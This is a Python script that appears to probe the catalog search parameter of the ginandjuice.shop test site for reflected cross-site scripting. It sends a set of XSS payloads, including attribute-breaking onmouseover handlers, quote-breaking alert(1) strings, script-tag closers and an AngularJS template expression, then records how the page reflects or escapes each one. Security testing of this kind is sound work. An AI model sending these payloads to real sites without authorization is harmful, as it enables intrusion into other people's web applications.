#!/usr/bin/env python3
"""IV14b — ginandjuice searchTerm adjudication over HTTPS (port-80 probe had
returned the http->https 302 redirect only). Same stdlib-only toolchain."""
import http.client
import json
import re
import ssl
import time
import urllib.parse

OUT = "/home/z/my-project/scripts/iv_out/iv14_claims_gj.json"
UA = "Mozilla/5.0 (compatible; IV14-Verifier/1.0; +independent-probe)"
CTX = ssl.create_default_context()


def https_get(path, timeout=15):
    conn = http.client.HTTPSConnection("ginandjuice.shop", 443, timeout=timeout, context=CTX)
    try:
        conn.request("GET", path, headers={"User-Agent": UA, "Accept": "*/*"})
        r = conn.getresponse()
        body = r.read(2_000_000).decode("utf-8", "replace")
        return {"status": r.status, "len": len(body),
                "location": r.getheader("Location") or "", "body": body}
    except Exception as e:
        return {"status": 0, "len": 0, "error": f"{type(e).__name__}: {e}", "body": ""}
    finally:
        conn.close()


def ctx(body, needle, before=70, after=40):
    i = body.find(needle)
    if i < 0:
        return None
    return body[max(0, i - before):i + len(needle) + after].replace("\n", " ")


def in_script(body, needle):
    i = body.find(needle)
    if i < 0:
        return None
    for m in re.finditer(r"<script\b.*?</script\s*>|<style\b.*?</style\s*>", body, re.S | re.I):
        if m.start() <= i < m.end():
            return True
    opens = len(re.findall(r"<script\b", body[:i], re.I)) + len(re.findall(r"<style\b", body[:i], re.I))
    closes = len(re.findall(r"</script\s*>", body[:i], re.I)) + len(re.findall(r"</style\s*>", body[:i], re.I))
    return opens > closes


probes = [
    ("ng_expr",        "{{91*7}}iv14ngmark"),
    ("tag_probe",      "<u>iv14tag</u>"),
    ("attr_break",     'iv14attr" onmouseover="alert(1)" x="'),
    ("js_quote",       "iv14q';alert(1)//"),
    ("js_dquote",      'iv14q";alert(1)//'),
    ("js_close_script", "iv14cs</script><u>iv14raw</u>"),
    ("js_backslash",   "iv14bs\\';alert(1)//"),
    ("plain",          "iv14plain"),
]
res = {"meta": {"when": time.strftime("%Y-%m-%d %H:%M:%S %z"),
                "note": "https direct; port-80 result was a plain http->https 302"}}
for label, val in probes:
    q = urllib.parse.urlencode({"searchTerm": val})
    r = https_get("/catalog?" + q)
    ent = {"status": r["status"], "len": r["len"], "location": r.get("location", "")[:80],
           "raw_reflected": val in r["body"], "in_script": in_script(r["body"], val),
           "context": ctx(r["body"], val)}
    if r["status"] == 200 and val in r["body"]:
        esc = val.replace("<", "&lt;").replace(">", "&gt;")
        ent["escaped_form_present"] = esc in r["body"]
        ent["has_ng_app"] = "ng-app" in r["body"].lower()
    res[label] = ent

# where does the reflection of a plain value land (sanity: the script block context)
r = https_get("/catalog?" + urllib.parse.urlencode({"searchTerm": "iv14plain"}))
i = r["body"].find("iv14plain")
res["plain_all_occurrences"] = [m.start() for m in re.finditer(re.escape("iv14plain"), r["body"])]
if i >= 0:
    # show every occurrence context briefly
    res["plain_contexts"] = [r["body"][max(0, m.start()-60):m.start()+50].replace("\n", " ")
                             for m in re.finditer(re.escape("iv14plain"), r["body"])][:4]

with open(OUT, "w") as f:
    json.dump(res, f, indent=1)
print(json.dumps(res, indent=1))
